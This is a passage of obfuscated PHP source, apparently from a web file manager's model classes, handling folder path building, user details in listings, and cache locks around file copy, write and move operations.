$this->parentLevelArray($Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[502]]); goto BÜøÁ·‰ô; BÚÕ–¨ï¿µ: } goto D¯­Õœ ³Å; AæÁÀ‡Æéø: unset($Eˆ¨òÍ¦ˆå); return $FÇÕ¯Ê; goto DÛ§÷Ì÷; dã‚÷‚ã‰: $B÷“äŠÔƒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $e…›‘Ñ©·˜ = array(); foreach ($FÇÕ¯Ê as &$Eˆ¨òÍ¦ˆå) { goto F¾ˆí§Ş¤; f´£ŠÔÚ ‡: $CÈçë‡•è— .= $Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[28]]; if ($Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[403]] == $cƒ£©†¬ƒ[87]) { $CÈçë‡•è— .= $cƒ£©†¬ƒ[8]; } $Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[500]] = str_replace($cƒ£©†¬ƒ[510], $cƒ£©†¬ƒ[8], $CÈçë‡•è—); goto Fˆ•«÷ÜĞ; Fˆ•«÷ÜĞ: if ($Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[478]] == $cƒ£©†¬ƒ[191]) { $Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[28]] = trim($F‡æêÔÜõ»[$Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[395]]], $cƒ£©†¬ƒ[8]); } if (intval($Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[404]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Eˆ¨òÍ¦ˆå, $cå‚ª×éê, $B÷“äŠÔƒ); } goto F×Å“ÉÊ½¡; F¾ˆí§Ş¤: $B§Ûã³§² = $Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[502]]; $CÈçë‡•è— = $cƒ£©†¬ƒ[33]; if (isset($e…›‘Ñ©·˜[$B§Ûã³§²])) { $CÈçë‡•è— = $e…›‘Ñ©·˜[$B§Ûã³§²]; } else { $cå‚ª×éê = $this->parentLevelArray($Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[502]]); foreach ($cå‚ª×éê as $c¯ÛŒì’½³ => $aÖÕ³Â÷„Î) { if (isset($F‡æêÔÜõ»[$aÖÕ³Â÷„Î])) { $CÈçë‡•è— .= $F‡æêÔÜõ»[$aÖÕ³Â÷„Î] . $cƒ£©†¬ƒ[8]; } } $e…›‘Ñ©·˜[$B§Ûã³§²] = $CÈçë‡•è—; } goto f´£ŠÔÚ ‡; F×Å“ÉÊ½¡: } goto AæÁÀ‡Æéø; D¯­Õœ ³Å: unset($Eˆ¨òÍ¦ˆå); $BËÀİëÃÖí = array_unique($BËÀİëÃÖí); if (count($BËÀİëÃÖí) > 0) { $CìÓËˆµê© = array($cƒ£©†¬ƒ[410] => array($cƒ£©†¬ƒ[411], $BËÀİëÃÖí)); if (count($BËÀİëÃÖí) == 1) { $bÑñŸºëã‹ = $this->sourceInfo($BËÀİëÃÖí[0]); $bĞŞöé„É¡ = is_array($bÑñŸºëã‹) ? array($bÑñŸºëã‹) : !1; } else { $bĞŞöé„É¡ = $this->field($cƒ£©†¬ƒ[509])->where($CìÓËˆµê©)->select(); } if (!$bĞŞöé„É¡) { $bĞŞöé„É¡ = array(); } foreach ($bĞŞöé„É¡ as $B”Ûèñç‚) { $F‡æêÔÜõ»[$B”Ûèñç‚[$cƒ£©†¬ƒ[395]]] = $B”Ûèñç‚[$cƒ£©†¬ƒ[28]]; } } goto dã‚÷‚ã‰; DÛ§÷Ì÷: } private function _listAppendPathRecycle(&$AàŒ¨“ï, $cÓÚÔ‡õ†İ, $Cé‰ãö²¦à) { goto EŠÇ¾ÎÕ­; EŠÇ¾ÎÕ­: $e”çÉô‹ŞÅ =& $_SERVER[æ§›¦ÌáØ]; if (!in_array($Cé‰ãö²¦à, $cÓÚÔ‡õ†İ) && $AàŒ¨“ï[$e”çÉô‹ŞÅ[395]] != $Cé‰ãö²¦à) { return; } $e†³â½ºÅ² = explode($e”çÉô‹ŞÅ[8], trim($AàŒ¨“ï[$e”çÉô‹ŞÅ[500]], $e”çÉô‹ŞÅ[8])); goto Cº Ğâ¬ç; cŒ—´‚Â§Ë: if ($AàŒ¨“ï[$e”çÉô‹ŞÅ[395]] == $Cé‰ãö²¦à) { $AàŒ¨“ï[$e”çÉô‹ŞÅ[502]] = $e”çÉô‹ŞÅ[512]; $AàŒ¨“ï[$e”çÉô‹ŞÅ[478]] = $e”çÉô‹ŞÅ[191]; $AàŒ¨“ï[$e”çÉô‹ŞÅ[28]] = LNG($e”çÉô‹ŞÅ[511]); } $AàŒ¨“ï[$e”çÉô‹ŞÅ[513]] = $e”çÉô‹ŞÅ[514]; goto cø×Äç—©™; Cº Ğâ¬ç: $d¦ÈŒ¥í…í = implode($e”çÉô‹ŞÅ[8], array_slice($e†³â½ºÅ², 2)); $AàŒ¨“ï[$e”çÉô‹ŞÅ[500]] = $e”çÉô‹ŞÅ[8] . LNG($e”çÉô‹ŞÅ[511]) . $e”çÉô‹ŞÅ[8] . ltrim($d¦ÈŒ¥í…í, $e”çÉô‹ŞÅ[8]); $AàŒ¨“ï[$e”çÉô‹ŞÅ[502]] = $e”çÉô‹ŞÅ[512] . implode($e”çÉô‹ŞÅ[47], array_slice($cÓÚÔ‡õ†İ, 1)) . $e”çÉô‹ŞÅ[47]; goto cŒ—´‚Â§Ë; cø×Äç—©™: } protected function _listAppendPathRoot(&$dª¶¤„ì–Ô, $BåÍ¦¥¢Á‰) { $E‹õºšÕ¢‚ =& $_SERVER[æ§›¦ÌáØ]; $AÁ±‰‚ÕÉ = $E‹õºšÕ¢‚[33]; if ($dª¶¤„ì–Ô[$E‹õºšÕ¢‚[404]] == self::TYPE_USER) { if (defined($E‹õºšÕ¢‚[454]) && $dª¶¤„ì–Ô[$E‹õºšÕ¢‚[484]] == USER_ID) { $AÁ±‰‚ÕÉ = LNG($E‹õºšÕ¢‚[515]); if (!$BåÍ¦¥¢Á‰) { $dª¶¤„ì–Ô[$E‹õºšÕ¢‚[28]] = $AÁ±‰‚ÕÉ; } } else { $e›Äö»ËÛ = Model($E‹õºšÕ¢‚[494])->getInfoSimple($dª¶¤„ì–Ô[$E‹õºšÕ¢‚[484]]); $AÁ±‰‚ÕÉ = LNG($E‹õºšÕ¢‚[516]) . $E‹õºšÕ¢‚[160] . $e›Äö»ËÛ[$E‹õºšÕ¢‚[28]] . $E‹õºšÕ¢‚[517]; } } else { if ($dª¶¤„ì–Ô[$E‹õºšÕ¢‚[404]] == self::TYPE_GROUP) { $e›Äö»ËÛ = Model($E‹õºšÕ¢‚[503])->getInfoSimple($dª¶¤„ì–Ô[$E‹õºšÕ¢‚[484]]); $AÁ±‰‚ÕÉ = $e›Äö»ËÛ[$E‹õºšÕ¢‚[28]]; } else { if ($dª¶¤„ì–Ô[$E‹õºšÕ¢‚[404]] == self::TYPE_SYSTEM) { $AÁ±‰‚ÕÉ = $E‹õºšÕ¢‚[518]; } } } $AÁ±‰‚ÕÉ = $AÁ±‰‚ÕÉ ? $E‹õºšÕ¢‚[8] . $AÁ±‰‚ÕÉ . $E‹õºšÕ¢‚[8] : $E‹õºšÕ¢‚[8]; return $AÁ±‰‚ÕÉ; } protected function _listAppendUser(&$fê¶ˆä‡ªÎ) { goto FŞâ¢·…¼Õ; FŞâ¢·…¼Õ: $E£Š‚‡ßçë =& $_SERVER[æ§›¦ÌáØ]; $A¿‹Ÿ¯© = array_to_keyvalue($fê¶ˆä‡ªÎ, $E£Š‚‡ßçë[33], $E£Š‚‡ßçë[432]); $DçÄ‰ïŞ‡ = array_to_keyvalue($fê¶ˆä‡ªÎ, $E£Š‚‡ßçë[33], $E£Š‚‡ßçë[434]); goto cÌÅ‘í †ù; cÌÅ‘í †ù: $F«š†‚íã = array_merge($A¿‹Ÿ¯©, $DçÄ‰ïŞ‡); $F¢õšˆ«å„ = Model($E£Š‚‡ßçë[519])->userListInfo($F«š†‚íã); foreach ($fê¶ˆä‡ªÎ as &$Fø¢ÜéŸç) { $cŠÄÀŠ‰Ù÷ = $Fø¢ÜéŸç[$E£Š‚‡ßçë[432]]; $Fø¢ÜéŸç[$E£Š‚‡ßçë[432]] = $F¢õšˆ«å„[$cŠÄÀŠ‰Ù÷] ? $F¢õšˆ«å„[$cŠÄÀŠ‰Ù÷] : !1; $cŠÄÀŠ‰Ù÷ = $Fø¢ÜéŸç[$E£Š‚‡ßçë[434]]; $Fø¢ÜéŸç[$E£Š‚‡ßçë[434]] = $F¢õšˆ«å„[$cŠÄÀŠ‰Ù÷] ? $F¢õšˆ«å„[$cŠÄÀŠ‰Ù÷] : !1; if (isset($Fø¢ÜéŸç[$E£Š‚‡ßçë[445]]) && $Fø¢ÜéŸç[$E£Š‚‡ßçë[445]][$E£Š‚‡ßçë[520]]) { $E‰É’‹Ë = $GLOBALS[$E£Š‚‡ßçë[6]][$E£Š‚‡ßçë[88]][$E£Š‚‡ßçë[521]]; if ($Fø¢ÜéŸç[$E£Š‚‡ßçë[445]][$E£Š‚‡ßçë[522]] <= time() - $E‰É’‹Ë) { $this->metaSet($Fø¢ÜéŸç[$E£Š‚‡ßçë[395]], $E£Š‚‡ßçë[520], null); $this->metaSet($Fø¢ÜéŸç[$E£Š‚‡ßçë[395]], $E£Š‚‡ßçë[522], null); unset($Fø¢ÜéŸç[$E£Š‚‡ßçë[445]][$E£Š‚‡ßçë[520]]); continue; } $Dš§Šøâ‚ = $Fø¢ÜéŸç[$E£Š‚‡ßçë[445]][$E£Š‚‡ßçë[520]]; $Fø¢ÜéŸç[$E£Š‚‡ßçë[445]][$E£Š‚‡ßçë[523]] = Model($E£Š‚‡ßçë[519])->getInfoSimpleOuter($Dš§Šøâ‚); } } goto B•¨ğğùÓ‘; B•¨ğğùÓ‘: unset($Fø¢ÜéŸç); goto C‰È³ô›¿; C‰È³ô›¿: } public function parentLevelArray($a¸âì©ãš) { $C®Û¤‡·Ô§ =& $_SERVER[æ§›¦ÌáØ]; $a¸âì©ãš = explode($C®Û¤‡·Ô§[47], trim($a¸âì©ãš, $C®Û¤‡·Ô§[47])); return array_remove_value($a¸âì©ãš, $C®Û¤‡·Ô§[191]); } public function listAll($a¢¹¡è…Œ) { goto cØ¤ã¨å×·; eİ®‘´Üİ˜: $CùÀó¯°‡İ = $Fá¥’‡˜ÔÊ[528]; $d‹àğ™âõ˜ = "\x4c\105\106\124\x20\x4a\117\111\116\40{$this->tablePrefix}\x69\x6f\x5f\146\x69\154\x65\x20\x66\x69\x6c\x65\x20\157\156\x20\163\x6f\165\162\143\145\56\x66\151\x6c\145\111\x44\x20\x3d\x20\146\x69\154\145\x2e\146\x69\154\145\x49\x44"; $FŒí™÷Ö¢ = $this->alias($Fá¥’‡˜ÔÊ[529])->field($CùÀó¯°‡İ)->where($AšãŸ…ƒŒ)->join($d‹àğ™âõ˜)->select(); goto F™×¨°Ä¼; A”æÀÚšÊª: $FŒí™÷Ö¢ = array_to_keyvalue($FŒí™÷Ö¢, $Fá¥’‡˜ÔÊ[395]); $D§Ü›¹òĞª = "\57{$b‹Ó˜ë‚ÒÔ[$Fá¥’‡˜ÔÊ[28]]}\x2f"; $D§Ü›¹òĞª = $D§Ü›¹òĞª == $Fá¥’‡˜ÔÊ[510] ? $Fá¥’‡˜ÔÊ[8] : $D§Ü›¹òĞª; goto CÜ¹ô“ÛĞ; CÜ¹ô“ÛĞ: $AÊ¢ª˜¨˜Â = array(); foreach ($FŒí™÷Ö¢ as $cİ‚Ú ¿Ãô => $b¡ñÏÛ‹î“) { goto dÖ¹Ÿç­; EÀƒÕÈ›‰†: if (!$b¡ñÏÛ‹î“[$Fá¥’‡˜ÔÊ[403]]) { $a¼­™Õ½Î[$Fá¥’‡˜ÔÊ[447]] = $b¡ñÏÛ‹î“[$Fá¥’‡˜ÔÊ[447]]; $a¼­™Õ½Î[$Fá¥’‡˜ÔÊ[86]] = $b¡ñÏÛ‹î“[$Fá¥’‡˜ÔÊ[76]]; } $AÊ¢ª˜¨˜Â[] = $a¼­™Õ½Î; goto fÉàÔ“ÉĞÅ; dÖ¹Ÿç­: $Còïë¯‰«’ = $this->parentLevelArray($b¡ñÏÛ‹î“[$Fá¥’‡˜ÔÊ[502]]); array_shift($Còïë¯‰«’); $aœŒ¦Š°å— = $D§Ü›¹òĞª; goto Dƒœƒä¿™´; Dƒœƒä¿™´: for ($CÀØ›…ˆæ÷ = 0; $CÀØ›…ˆæ÷ < count($Còïë¯‰«’); $CÀØ›…ˆæ÷++) { $aœŒ¦Š°å— .= $FŒí™÷Ö¢[$Còïë¯‰«’[$CÀØ›…ˆæ÷]][$Fá¥’‡˜ÔÊ[28]] . $Fá¥’‡˜ÔÊ[8]; } $aœŒ¦Š°å— .= $b¡ñÏÛ‹î“[$Fá¥’‡˜ÔÊ[28]]; if ($b¡ñÏÛ‹î“[$Fá¥’‡˜ÔÊ[403]]) { $aœŒ¦Š°å— .= $Fá¥’‡˜ÔÊ[8]; } goto aªù†»Ç—™; aªù†»Ç—™: $aœŒ¦Š°å— = str_replace($Fá¥’‡˜ÔÊ[510], $Fá¥’‡˜ÔÊ[8], $aœŒ¦Š°å—); $aœŒ¦Š°å— = str_replace($Fá¥’‡˜ÔÊ[510], $Fá¥’‡˜ÔÊ[8], $aœŒ¦Š°å—); $a¼­™Õ½Î = array($Fá¥’‡˜ÔÊ[414] => str_replace($Fá¥’‡˜ÔÊ[510], $Fá¥’‡˜ÔÊ[8], $aœŒ¦Š°å—), $Fá¥’‡˜ÔÊ[530] => intval($b¡ñÏÛ‹î“[$Fá¥’‡˜ÔÊ[403]]), $Fá¥’‡˜ÔÊ[85] => $this->pathInfoFilter($b¡ñÏÛ‹î“)); goto EÀƒÕÈ›‰†; fÉàÔ“ÉĞÅ: } return $AÊ¢ª˜¨˜Â; goto c½ºáĞˆ‚ø; cØ¤ã¨å×·: $Fá¥’‡˜ÔÊ =& $_SERVER[æ§›¦ÌáØ]; $b‹Ó˜ë‚ÒÔ = $this->sourceInfo($a¢¹¡è…Œ); $AšãŸ…ƒŒ = array($Fá¥’‡˜ÔÊ[524] => array($Fá¥’‡˜ÔÊ[525], $b‹Ó˜ë‚ÒÔ[$Fá¥’‡˜ÔÊ[502]] . $a¢¹¡è…Œ . $Fá¥’‡˜ÔÊ[526]), $Fá¥’‡˜ÔÊ[527] => 0); goto eİ®‘´Üİ˜; F™×¨°Ä¼: $this->_listAppendAuth($FŒí™÷Ö¢); $this->_listAppendUser($FŒí™÷Ö¢); $this->_listAppendPath($FŒí™÷Ö¢); goto A”æÀÚšÊª; c½ºáĞˆ‚ø: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($BŞŠİã…Õ‡) { goto C¾èŞ²ÃøÜ; C¾èŞ²ÃøÜ: $EŠ‘¬áÁ°Ä =& $_SERVER[æ§›¦ÌáØ]; if (!$this->allowLock()) { return; } $this->_lockCheck($EŠ‘¬áÁ°Ä[531], $BŞŠİã…Õ‡); goto C†°Æ¢ë¢à; B›½ ‹ò–†: $this->_lockEvent($BŞŠİã…Õ‡, array($EŠ‘¬áÁ°Ä[534], $EŠ‘¬áÁ°Ä[535]), $CŒ„‹´·‰); $this->_lockCheckEnd($EŠ‘¬áÁ°Ä[531], $BŞŠİã…Õ‡); goto D×•×âŠœ; C†°Æ¢ë¢à: $CŒ„‹´·‰ = 1; $this->_lockEvent($BŞŠİã…Õ‡, array($EŠ‘¬áÁ°Ä[532], $EŠ‘¬áÁ°Ä[533]), $CŒ„‹´·‰); $this->_lockParent($BŞŠİã…Õ‡, array($EŠ‘¬áÁ°Ä[533]), $CŒ„‹´·‰); goto B›½ ‹ò–†; D×•×âŠœ: } public function lockCopyEnd($F‡ê…¿Ãì) { $fØïØ¬õ¸ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->allowLock()) { return; } $DæÊèŠ¦¾¿ = 0; $this->_lockEvent($F‡ê…¿Ãì, array($fØïØ¬õ¸[532], $fØïØ¬õ¸[533]), $DæÊèŠ¦¾¿); $this->_lockParent($F‡ê…¿Ãì, array($fØïØ¬õ¸[533]), $DæÊèŠ¦¾¿); $this->_lockEvent($F‡ê…¿Ãì, array($fØïØ¬õ¸[534], $fØïØ¬õ¸[535]), $DæÊèŠ¦¾¿); } public function lockWriteStart($dÃ»¾½œèï, $C“†°•‘ÈÓ = '') { goto A…ìÊ©÷‹ª; A…ï¨¡µ›: $this->_lockParent($dÃ»¾½œèï, array($A¾ßŠ‚ÖÑ[531], $A¾ßŠ‚ÖÑ[533]), $A‡¹Èˆíî¸); $this->_lockCheckEnd($A¾ßŠ‚ÖÑ[532], $dÃ»¾½œèï); goto DÏ¸ßäª; cïÙÂåì¨å: $A‡¹Èˆíî¸ = 1; $this->_lockKey($A¾ßŠ‚ÖÑ[536] . $dÃ»¾½œèï . $A¾ßŠ‚ÖÑ[95] . $C“†°•‘ÈÓ, $A‡¹Èˆíî¸); $this->_lockEvent($dÃ»¾½œèï, array($A¾ßŠ‚ÖÑ[531], $A¾ßŠ‚ÖÑ[533]), $A‡¹Èˆíî¸); goto A…ï¨¡µ›; A…ìÊ©÷‹ª: $A¾ßŠ‚ÖÑ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->allowLock()) { return; } $this->_lockCheck($A¾ßŠ‚ÖÑ[532], $dÃ»¾½œèï); goto cïÙÂåì¨å; DÏ¸ßäª: } public function lockWriteEnd($DÍ„»âåˆ, $aÒÂ’…íŸ¶ = '') { $fºŒ¥ùºÜï =& $_SERVER[æ§›¦ÌáØ]; if (!$this->allowLock()) { return; } $D§ØÌÖÙ² = 0; $this->_lockKey($fºŒ¥ùºÜï[536] . $DÍ„»âåˆ . $fºŒ¥ùºÜï[95] . $aÒÂ’…íŸ¶, $D§ØÌÖÙ²); $this->_lockEvent($DÍ„»âåˆ, array($fºŒ¥ùºÜï[531], $fºŒ¥ùºÜï[533]), $D§ØÌÖÙ²); $this->_lockParent($DÍ„»âåˆ, array($fºŒ¥ùºÜï[531], $fºŒ¥ùºÜï[533]), $D§ØÌÖÙ²); } public function lockMoveStart($Eè‚ß¢‰Ø) { goto EÖæ÷Èèï; FßôØ‘Şó²: $this->_lockParent($Eè‚ß¢‰Ø, array($Fà¶ÍÜÙéÖ[531], $Fà¶ÍÜÙéÖ[533]), $Eƒ¤õŒ¡Ñ›); $this->_lockEvent($Eè‚ß¢‰Ø, array($Fà¶ÍÜÙéÖ[538], $Fà¶ÍÜÙéÖ[534], $Fà¶ÍÜÙéÖ[535]), $Eƒ¤õŒ¡Ñ›); $this->_lockCheckEnd($Fà¶ÍÜÙéÖ[533], $Eè‚ß¢‰Ø); goto fá«â‘î¨ ; EÖæ÷Èèï: $Fà¶ÍÜÙéÖ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Fà¶ÍÜÙéÖ[533], $Eè‚ß¢‰Ø); goto C‡ùäÀò‚…; C‡ùäÀò‚…: $Eƒ¤õŒ¡Ñ› = 1; $this->_lockKey($Fà¶ÍÜÙéÖ[537] . $Eè‚ß¢‰Ø, $Eƒ¤õŒ¡Ñ›); $this->_lockEvent($Eè‚ß¢‰Ø, array($Fà¶ÍÜÙéÖ[531], $Fà¶ÍÜÙéÖ[532]), $Eƒ¤õŒ¡Ñ›); goto FßôØ‘Şó²; fá«â‘î¨ : } public function lockMoveEnd($EäêÜâÛË) { goto Dğ…ó¼­·…; DÔÈ£ø¶Ù£: $this->_lockKey($ağÀ”Ø¡ˆ£[537] . $EäêÜâÛË, $f¶ô¤ôÕğ); $this->_lockEvent($EäêÜâÛË, array($ağÀ”Ø¡ˆ£[531], $ağÀ”Ø¡ˆ£[532]), $f¶ô¤ôÕğ); $this->_lockParent($EäêÜâÛË, array($ağÀ”Ø¡ˆ£[531], $ağÀ”Ø¡ˆ£[533]), $f¶ô¤ôÕğ); goto bêÖå÷ì˜­; bêÖå÷ì˜­: $this->_lockEvent($EäêÜâÛË, array($ağÀ”Ø¡ˆ£[538], $ağÀ”Ø¡ˆ£[534], $ağÀ”Ø¡ˆ£[535]), $f¶ô¤ôÕğ); goto f¿¯ÛØ‡Å; Dğ…ó¼­·…: $ağÀ”Ø¡ˆ£ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->allowLock()) { return; } $f¶ô¤ôÕğ = 0; goto DÔÈ£ø¶Ù£; f¿¯ÛØ‡Å: } private function _lockCheck($fŒÔ¡¶ğ”Œ, $c¹“ÌÕØˆ) { goto c„ĞÄËå¦×; E»’ìÛÚ›À: $this->_lockTimeStart[$b†°îë—ªÂ] = timeFloat(); if (!is_array($eÕø¢äŒå)) { return; } $DæÎ¼ñîÊ¢ = LNG($a‘³Ë†ÇÃÎ[539]); goto DÑßçİ; c„ĞÄËå¦×: $a‘³Ë†ÇÃÎ =& $_SERVER[æ§›¦ÌáØ]; $eÕø¢äŒå = $this->sourceInfo($c¹“ÌÕØˆ); $b†°îë—ªÂ = $fŒÔ¡¶ğ”Œ . $a‘³Ë†ÇÃÎ[95] . $c¹“ÌÕØˆ; goto E»’ìÛÚ›À; DÑßçİ: CacheLock::setErrorMsg($a‘³Ë†ÇÃÎ[160] . htmlspecialchars($eÕø¢äŒå[$a‘³Ë†ÇÃÎ[28]]) . $a‘³Ë†ÇÃÎ[517] . $DæÎ¼ñîÊ¢); $this->_lockKey($b†°îë—ªÂ, 1); $this->_lockKey($b†°îë—ªÂ, 0); goto b»„•†Ò¾Ş; b»„•†Ò¾Ş: $F©Ô¯¸ì®Ÿ = array_reverse($this->parentLevelArray($eÕø¢äŒå[$a‘³Ë†ÇÃÎ[502]])); foreach ($F©Ô¯¸ì®Ÿ as $dÏÖÅ—‹Şõ) { $b†°îë—ªÂ = $fŒÔ¡¶ğ”Œ . $a‘³Ë†ÇÃÎ[540] . $dÏÖÅ—‹Şõ; if (CacheLock::lockGet($a‘³Ë†ÇÃÎ[541] . $b†°îë—ªÂ)) { $eÕø¢äŒå = $this->sourceInfo($dÏÖÅ—‹Şõ); CacheLock::setErrorMsg($a‘³Ë†ÇÃÎ[160] . htmlspecialchars($eÕø¢äŒå[$a‘³Ë†ÇÃÎ[28]]) . $a‘³Ë†ÇÃÎ[517] . $DæÎ¼ñîÊ¢); $this->_lockKey($b†°îë—ªÂ, 1); $this->_lockKey($b†°îë—ªÂ, 0); } } goto cñ¸ß˜´»Ğ; cñ¸ß˜´»Ğ: } private function _lockCheckEnd($F¾ƒàøéÁ®, $dãç¹ù¿ÁØ) { goto Dˆ¶¤›ù£; Dˆ¶¤›ù£: $A¶ëÇ§¦™µ =& $_SERVER[æ§›¦ÌáØ]; $dŸÖùõ¼½í = $F¾ƒàøéÁ® . $A¶ëÇ§¦™µ[95] . $dãç¹ù¿ÁØ; CacheLock::setErrorMsg($A¶ëÇ§¦™µ[375]); goto dî—Ü¼»‘Ñ; dî—Ü¼»‘Ñ: if (!isset($this->_lockTimeStart[$dŸÖùõ¼½í])) { return; } $AÊçËÖÜ = timeFloat() - $this->_lockTimeStart[$dŸÖùõ¼½í]; unset($this->_lockTimeStart[$dŸÖùõ¼½í]); goto eÃ±­˜¬Ñ‚; eÃ±­˜¬Ñ‚: if ($AÊçËÖÜ > 0.5) { unset(self::$cacheSourceInfo[$A¶ëÇ§¦™µ[438] . $dãç¹ù¿ÁØ]); } $Cª´ÎËÜ‰µ = $this->sourceInfo($dãç¹ù¿ÁØ); if (!$Cª´ÎËÜ‰µ) { show_json(LNG($A¶ëÇ§¦™µ[105]), !1); } goto cŸÃ¢Ä¨Æé; cŸÃ¢Ä¨Æé: } private function _lockParent($b¾Œ„Š×­§, $E‹Š°˜é, $Cª×…˜×¹ö) { if (!$this->autoLockSet) { return; } $D“…¨Æ‡µ® = $this->sourceInfo($b¾Œ„Š×­§); if (!is_array($D“…¨Æ‡µ®)) { return; } $EÖĞ©‰Äé = array_reverse($this->parentLevelArray($D“…¨Æ‡µ®[$_SERVER[æ§›¦ÌáØ][502]])); foreach ($EÖĞ©‰Äé as $EŸ™Ì¡ˆÔ“) { $this->_lockEvent($EŸ™Ì¡ˆÔ“, $E‹Š°˜é, $Cª×…˜×¹ö); } } private function _lockEvent($cµ¥¢ËÍßë, $c•“»ƒ«©Ç, $b“ÑÏ˜‰ìŸ) { $C¨®ë¾Ä¯† =& $_SERVER[æ§›¦ÌáØ]; if (!$this->autoLockSet) { return; } foreach ($c•“»ƒ«©Ç as $cÊÑ´íà¡) { $E–‚ ö‚šà = $cÊÑ´íà¡ . $C¨®ë¾Ä¯†[95] . $cµ¥¢ËÍßë; if ($b“ÑÏ˜‰ìŸ && CacheLock::lockGet($C¨®ë¾Ä¯†[541] . $E–‚ ö‚šà)) { continue; } $this->_lockKey($E–‚ ö‚šà, $b“ÑÏ˜‰ìŸ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($B¡èèâ£§, $e‡’ÀÂ§£õ = 1) { $BƒĞíŒ°Ãø = $_SERVER[æ§›¦ÌáØ][541] . md5($B¡èèâ£§); if ($e‡’ÀÂ§£õ) { if (isset(self::$_lockItemArr[$BƒĞíŒ°Ãø])) { return; } self::$_lockItemArr[$BƒĞíŒ°Ãø] = 1; CacheLock::lock($BƒĞíŒ°Ãø, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$BƒĞíŒ°Ãø])) { return; } unset(self::$_lockItemArr[$BƒĞíŒ°Ãø]); CacheLock::unlock($BƒĞíŒ°Ãø); } } public function isParentOf($cÎŞæˆÂÎø, $b×Â’İø›ˆ) { goto fÒç²¦ï•Ì; f‰õ†î‹“ª: $e§‹‰á…¥­ = $cÉôÈòİÙê[$cˆœ§º‘[502]] . $cÉôÈòİÙê[$cˆœ§º‘[395]] . $cˆœ§º‘[47]; $fá“¾¶ÍÕ— = $eÂ¶ß²¨×Œ[$cˆœ§º‘[502]] . $eÂ¶ß²¨×Œ[$cˆœ§º‘[395]] . $cˆœ§º‘[47]; $c—·˜•ÔÁê = strpos($fá“¾¶ÍÕ—, $e§‹‰á…¥­) === 0; goto A…¸ÔŒ°Ÿé; A…¸ÔŒ°Ÿé: return $c—·˜•ÔÁê; goto Cäñù«¸ñ; fÒç²¦ï•Ì: $cˆœ§º‘ =& $_SERVER[æ§›¦ÌáØ]; $cÉôÈòİÙê = $this->sourceInfo($cÎŞæˆÂÎø); $eÂ¶ß²¨×Œ = $this->sourceInfo($b×Â’İø›ˆ); goto f‰õ†î‹“ª; Cäñù«¸ñ: } private $targetIsDelete = 0; public function copy($a…Æ¥¶‘”Ş, $cĞ«Ó„³¬«, $DÀ±™£¶¥Á = REPEAT_REPLACE, $EçéŠ…¥Óæ = '') { goto Eìé³Œ„Ã‚; a—âï„ªß“: $this->saveAll($a‚ÓµÆ«¥[$BŞàê¯ì¶ƒ[544]]); Model($BŞàê¯ì¶ƒ[193])->linkAdd($a‚ÓµÆ«¥[$BŞàê¯ì¶ƒ[542]]); $this->folderSizeReset($cĞ«Ó„³¬«); goto cºâœôŒôã; b¬ÑŒ¢Ìó›: if ($D¼¤é•á©Š[$BŞàê¯ì¶ƒ[403]] == $BŞàê¯ì¶ƒ[87] && $Eñ¼ŞòßÑñ == $FÜ‘¥¥Ô¤) { $this->folderSizeResetChildren($Eñ¼ŞòßÑñ); } Model($BŞàê¯ì¶ƒ[545])->addAll($a‚ÓµÆ«¥[$BŞàê¯ì¶ƒ[543]], array(), !0); if ($Eñ¼ŞòßÑñ != $FÜ‘¥¥Ô¤ || $D¼¤é•á©Š[$BŞàê¯ì¶ƒ[403]] == $BŞàê¯ì¶ƒ[87]) { Model($BŞàê¯ì¶ƒ[546])->eventCopy($FÜ‘¥¥Ô¤); } goto a—âï„ªß“; cºâœôŒôã: $this->updateModifyTime($cĞ«Ó„³¬«); return $FÜ‘¥¥Ô¤; goto E¦†Øö‚£; cÌ¹ÕâæÜæ: if (!$D¼¤é•á©Š || !$Cğ°ˆ©Ë°è || $Cğ°ˆ©Ë°è[$BŞàê¯ì¶ƒ[403]] != $BŞàê¯ì¶ƒ[87]) { return !1; } if ($this->isParentOf($a…Æ¥¶‘”Ş, $cĞ«Ó„³¬«)) { return !1; } $b‰„ÒŸâ¸à = $EçéŠ…¥Óæ ? $EçéŠ…¥Óæ : $D¼¤é•á©Š[$BŞàê¯ì¶ƒ[28]]; goto F¹Š±ã«Õœ; cÀ…éØÎ™‰: $this->targetIsDelete = intval($D¼¤é•á©Š[$BŞàê¯ì¶ƒ[423]]); $Eñ¼ŞòßÑñ = $this->fileNameExistCache($cĞ«Ó„³¬«, $D¼¤é•á©Š[$BŞàê¯ì¶ƒ[28]]); $FÜ‘¥¥Ô¤ = $this->_copy($a…Æ¥¶‘”Ş, $cĞ«Ó„³¬«, $DÀ±™£¶¥Á, $a‚ÓµÆ«¥, !0, $EçéŠ…¥Óæ); goto fØß™ÒŒÅ½; F¹Š±ã«Õœ: $this->lockCopyStart($a…Æ¥¶‘”Ş); $this->lockWriteStart($cĞ«Ó„³¬«, $b‰„ÒŸâ¸à); $a‚ÓµÆ«¥ = array($BŞàê¯ì¶ƒ[542] => array(), $BŞàê¯ì¶ƒ[543] => array(), $BŞàê¯ì¶ƒ[544] => array()); goto cÀ…éØÎ™‰; fØß™ÒŒÅ½: $this->_childrenListClear(); $this->lockCopyEnd($a…Æ¥¶‘”Ş); $this->lockWriteEnd($cĞ«Ó„³¬«, $b‰„ÒŸâ¸à); goto b¬ÑŒ¢Ìó›; Eìé³Œ„Ã‚: $BŞàê¯ì¶ƒ =& 